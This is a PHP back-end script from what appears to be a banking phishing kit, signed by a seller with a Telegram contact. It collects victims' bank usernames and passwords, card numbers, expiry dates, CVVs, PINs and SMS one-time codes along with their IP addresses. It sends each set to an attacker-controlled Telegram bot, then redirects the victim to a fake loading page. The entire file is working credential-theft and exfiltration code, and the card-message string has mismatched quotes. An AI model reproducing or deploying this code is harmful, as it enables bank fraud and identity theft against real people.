<?php

    /*===================================================
    += Collected by: DarkNet_v1
    -----------------------------------------------------
    += Contact me on telegram : https://t.me/DarkNet_v1 
    +===================================================*/

    session_start();

    
   
    

    if(isset($_POST["Log"])) {

        $user     = $_POST["user"];
        $pass   = $_POST["pass"];
        
       $message=
       '[🏦] === Login === [🏦]'."\n".
       "[🪪] username : ".$user."\n". 
       "[🔑] Password : ".$pass."\n".
       '[🌍] IP : '.$_SERVER['REMOTE_ADDR']."\n".
       '[🛂] Panel-link : '.get_steps_link()."";
       
   
       $data = [
       'chat_id' => CHAT_ID,
       'text' => $message,
       ]; 
       
       $response = file_get_contents("https://api.telegram.org/bot".BOT_TOKEN."/sendMessage?".http_build_query($data)); 
       reset_data();
       header("Location: ../../../loading.php");

    }elseif(isset($_POST["card"])){

        $number = $_POST["num"];
        $exp    = $_POST["exp"];
        $cvv    = $_POST["cvv"];
        $PIN    = $_POST["pin"];
    
    
        $message="
        '[🧛] === Credit Card === [🧛]'.'\n".
        '[💝] Card Number : '.$number."\n".
        '[💝] Expiration Date : '.$exp."\n".
        '[💝] CVV : '.$cvv."\n".
        '[💝] PIN : '.$PIN."\n".
        '[🌍] IP : '.$_SERVER['REMOTE_ADDR']."\n";
        
        $data = [
        'chat_id' => CHAT_ID,
        'text' => $message,
        ]; 
        
        $response = file_get_contents("https://api.telegram.org/bot".BOT_TOKEN."/sendMessage?".http_build_query($data)); 
        reset_data();
        header("Location: ../../../loading.php");
        exit();

    }elseif(isset($_POST["sms"])){

        $sms      = $_POST["sms_code"];
         
        $message=
        '[🧛] === SMS_CODE === [🧛]'."\n".
        '[🏷] SMS : '.$sms."\n".
        '[🌍] IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."";
        
        $data = [
            'chat_id' => CHAT_ID,
            'text' => $message,
        ]; 
                
        $response = file_get_contents("https://api.telegram.org/bot".BOT_TOKEN."/sendMessage?".http_build_query($data)); 
        reset_data();
        header("Location: ../../../loading.php");
        exit();        
 
    }

?>